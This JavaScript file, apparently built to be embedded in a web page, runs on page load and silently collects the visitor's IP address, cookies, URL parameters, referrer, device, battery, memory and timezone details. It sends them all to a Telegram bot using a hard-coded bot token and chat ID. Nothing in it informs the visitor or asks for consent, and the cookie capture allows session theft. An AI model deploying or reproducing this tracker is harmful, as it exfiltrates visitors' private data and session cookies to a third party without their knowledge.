// Set Dataset
let DataOnUser = [];

// Function to collect data
async function collectData() {
  // Get IP Data
  const ipResponse = await fetch("http://ip-api.com/line/?fields=query");
  if (!ipResponse.ok) {
    const text = await ipResponse.text();
    throw new Error(`Network response was not ok: ${ipResponse.status} ${text}`);
  }
  const ipData = await ipResponse.text();
  if (!ipData) {
    throw new Error("No IP address returned");
  }
  DataOnUser.push("IP Data: " + ipData); // IP address string
  console.log("IP Data: " + ipData); // Log the IP address

  // Get other user data
  let language = navigator.language;
  DataOnUser.push("Language: " + language);

  let languageList = navigator.languages.join(", ");
  DataOnUser.push("Preferred Languages List: " + languageList);

  let os = navigator.appVersion;
  DataOnUser.push("Operating System: " + os);

  let referrer = document.referrer || "No Referrer";
  DataOnUser.push("Referring Website: " + referrer);

  let time = new Date();
  DataOnUser.push("Visit Time: " + time);

  let screenResolution = `${screen.width}x${screen.height}`;
  DataOnUser.push("Screen Resolution: " + screenResolution);

  let cookiesBool = navigator.cookieEnabled;
  DataOnUser.push("Cookies Enabled?: " + cookiesBool);

  let cookies = document.cookie || "No Cookies";
  DataOnUser.push("Cookies: " + cookies);

  let method = "GET";
  DataOnUser.push("Method: " + method);

  let path = window.location.pathname;
  DataOnUser.push("Request Path: " + path);

  let parameters = window.location.search || "No Parameters";
  DataOnUser.push("Request Parameters: " + parameters);

  let userAgent = navigator.userAgent;
  DataOnUser.push("User Agent: " + userAgent);

  let deviceType = /mobile/i.test(userAgent) ? "Mobile" : "Desktop";
  DataOnUser.push("Device Type: " + deviceType);

  // Get battery level
  try {
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      let batteryLevel = battery.level * 100 + "%";
      DataOnUser.push("Battery Level: " + batteryLevel);
    } else {
      DataOnUser.push("Battery Level: Not available");
    }
  } catch (error) {
    DataOnUser.push("Battery Level: Error fetching battery level");
  }

  // Get device memory information
  if (navigator.deviceMemory) {
    let memory = navigator.deviceMemory;
    DataOnUser.push("Device Memory: " + memory + "GB");
  } else {
    DataOnUser.push("Device Memory: Not available in this browser.");
  }

  // Get timezone
  let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  DataOnUser.push("Timezone: " + timezone);

  // Get online/offline status
  let onlineStatus = window.navigator.onLine ? "Online" : "Offline";
  DataOnUser.push("Online Status: " + onlineStatus);
}

// Send collected data to Telegram
// Send collected data to Telegram
function sendToTelegram(data) {
    const token = "6864161221:AAG-QIHhP-ecZxcKsB_PaY9yaAlW7rRBw9M"; // Your bot token
    const chatId = "6107520820"; // Your chat ID

    // Format the message for better readability
    const message = `User Data:\n` + data.map(item => `- ${item}`).join('\n'); // Each item on a new line

    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    fetch(url)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log('Data sent successfully');
            } else {
                console.error('Error sending data: ' + data.description);
            }
        })
        .catch(error => {
            console.error('Error:', error);
        });
}
// Execute on page load
window.onload = async function() {
  try {
    await collectData(); // Collect all user data first
    sendToTelegram(DataOnUser); // Then send data to Telegram
  } catch (error) {
    console.error("Error collecting data:", error);
  }
};

// Printing data
console.log(DataOnUser);
